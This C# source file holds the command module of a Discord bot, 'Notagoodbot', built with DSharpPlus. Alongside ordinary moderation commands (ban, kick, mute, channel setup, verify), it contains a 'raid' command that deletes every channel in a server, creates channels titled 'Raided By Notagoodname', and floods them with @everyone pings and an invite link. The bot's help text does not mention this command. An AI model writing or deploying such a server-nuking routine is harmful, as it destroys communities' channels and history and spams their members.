using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.Entities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Remoting.Contexts;
using System.Threading.Tasks;


namespace TestBot.commands
{
    internal class TestCommands : BaseCommandModule
    {
        [Command("help")]
        public async Task HelpEmbed(CommandContext ctx)
        {
            var message = new DiscordMessageBuilder()
                .AddEmbed(new DiscordEmbedBuilder()
                .WithTitle("Notagoodbot")
                .WithDescription("This Bot Doesn't Have Very Many Features")
                .WithAuthor("Made By Notagoodname")
                .WithImageUrl("https://cdn.discordapp.com/attachments/1199839727658999829/1218334444084265090/e.png?ex=6607495f&is=65f4d45f&hm=bef3a37594a27e2f6ebdb6b42db4e56a87328c557a98de75e0b81f7c607fb7fe&")
                );
            await ctx.Channel.SendMessageAsync(message);
        }
        [Command("rules")]
        public async Task Jurlyqwiofefgihbqwegroiuhgwr(CommandContext ctx)
        {
            var message = new DiscordMessageBuilder()
                .AddEmbed(new DiscordEmbedBuilder()
                .WithTitle("Rules")
                .WithDescription("1: no homophobia\r\n2: no racism\r\n3: no general offense things\r\n4: be kind to each other\r\n5: no spamming \r\n6: Don’t be annoying to people\r\n7: do not ping everyone or a entire role\r\n8: don’t promote discords and other stuff\r\n9: have fun\r\n10: do not call people retarted or be toxic in any way\r\n11: no nword baiting")
                .WithColor(DiscordColor.Magenta)
                );;
            await ctx.Channel.SendMessageAsync(message);
        }
        [Command("ban")]
        [RequirePermissions(Permissions.BanMembers)]
        public async Task ban(CommandContext ctx, DiscordMember member, string reason = null)
        {
            if (!ctx.Member.PermissionsIn(ctx.Channel).HasPermission(Permissions.BanMembers))
            {
                await ctx.RespondAsync("You don't have the required permissions to ban members.");
                return;
            }
            await member.BanAsync(7, reason);
            await ctx.RespondAsync($"User {member.Username}#{member.Discriminator} has been banned. Reason: {reason ?? "No reason provided."}");
        }
        [Command("mute")]
        public async Task TimeoutCommand(CommandContext ctx, DiscordMember member, DateTimeOffset? duration, string reason = null)
        {
            if (!ctx.Member.PermissionsIn(ctx.Channel).HasPermission(Permissions.ManageMessages))
            {
                await ctx.RespondAsync("You don't have permission to use this command.");
                return;
            }
            if (reason == null)
            {
                reason = "No Reason Provided";
            }
            await ctx.RespondAsync($"Timing Out {member.Mention} for {duration}...");
            await member.TimeoutAsync(duration, reason);
            await ctx.RespondAsync($"Timeout for {member.Mention} has ended.");
        }
        [Command("kick")]
        [RequirePermissions(Permissions.KickMembers)]
        public async Task kick(CommandContext ctx, DiscordMember member, string reason = null)
        {
            if (!ctx.Member.PermissionsIn(ctx.Channel).HasPermission(Permissions.KickMembers))
            {
                await ctx.RespondAsync("You don't have the required permissions to kick members.");
                return;
            }
            await member.RemoveAsync(reason);
            await ctx.RespondAsync($"User {member.Username}#{member.Discriminator} has been kicked. Reason: {reason ?? "No reason provided."}");
        }
            [Command("setupserver")]
            [RequirePermissions(Permissions.ManageChannels)]
            public async Task SetupServer(CommandContext ctx)
            {
                if (!ctx.Member.PermissionsIn(ctx.Channel).HasPermission(Permissions.ManageChannels))
                {
                    await ctx.RespondAsync("You do not have permission to use this command.");
                    return;
                }
                Dictionary<string, string> channelData = new Dictionary<string, string>
        {
            { "verify", "✅" },
            { "announcements", "📢" },
            { "general", "✨" },
            { "download", "💾" },
            { "features", "⚙️" },
        };

                foreach (var kvp in channelData)
                {
                    var channelName = kvp.Key;
                    var emoji = kvp.Value;
                    var guild = ctx.Guild;
                    var newChannel = await guild.CreateTextChannelAsync(channelName);
                    var channelNameWithEmoji = $"{channelName} {emoji}";
                    await newChannel.ModifyAsync(channel => channel.Name = channelNameWithEmoji);
                    if (channelData != null)
                    {
                        await ctx.RespondAsync($"Channels and Roles created successfully.");
                    }
                    else
                    {
                        await ctx.RespondAsync($"Failed to create channel '{channelName}'.");
                    }
                }
                var verifiedRole = await ctx.Guild.CreateRoleAsync("Verified ✅");
                var ModeratorRole = await ctx.Guild.CreateRoleAsync("Moderator 🛡");
                var OwnerRole = await ctx.Guild.CreateRoleAsync("Owner 👑");
                await verifiedRole.ModifyAsync(permissions: Permissions.SendMessages);
                await OwnerRole.ModifyAsync(permissions: Permissions.Administrator);
            }
        [Command("deletechannel")]
        [RequirePermissions(Permissions.ManageChannels)]
        public async Task deleteChannel(CommandContext ctx, DiscordChannel channel)
        {
            if (ctx.Member.Permissions.HasPermission(Permissions.ManageChannels))
            {
                await channel.DeleteAsync();
                await ctx.RespondAsync($"Channel '{channel.Name}' deleted successfully.");
            }
            else
            {
                await ctx.RespondAsync("You do not have permission to delete channels.");
                return;
            }
        }
        [Command("raid")]
        [RequirePermissions(Permissions.Administrator)]
        public async Task Raid(CommandContext ctx)
        {
            if (!ctx.Member.Permissions.HasPermission(Permissions.Administrator))
            {
                await ctx.RespondAsync("You do not have permission to delete or create channels.");
                return;
            }
            var channels = await ctx.Guild.GetChannelsAsync();
            foreach (var channel in channels)
            {
                try
                {
                    await channel.DeleteAsync();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to delete channel {channel.Name}: {ex.Message}");
                }
            }
            var channelNames = new List<string> { "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname", "Raided By Notagoodname" };
            foreach (var name in channelNames)
            {
                try
                {
                    var newChannel = await ctx.Guild.CreateTextChannelAsync(name);
                    Console.WriteLine($"Channel {newChannel.Name} created successfully.");
                    await Task.Delay(350);
                    for (int i = 0; i < 19; i++)
                    {
                        await newChannel.SendMessageAsync("@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone https://discord.gg/KnCVbRvsKk");
                        await Task.Delay(350);
                    }
                }
                catch (Exception ex)
                {
                    await ctx.RespondAsync($"{ex.Message}");
                }
            }
        }
        [Command("verify")]
        public async Task Verify(CommandContext ctx)
        {
            var verifyButton = new DiscordButtonComponent(ButtonStyle.Success, "verifybutton", "Verify");
            var messageBuilder = new DiscordMessageBuilder()
                .WithEmbed(new DiscordEmbedBuilder()
                    .WithDescription("Click The Green Button To Verify")
                    .WithColor(DiscordColor.Green))
                .AddComponents(verifyButton);

            await ctx.Channel.SendMessageAsync(messageBuilder);
        }

    }
}
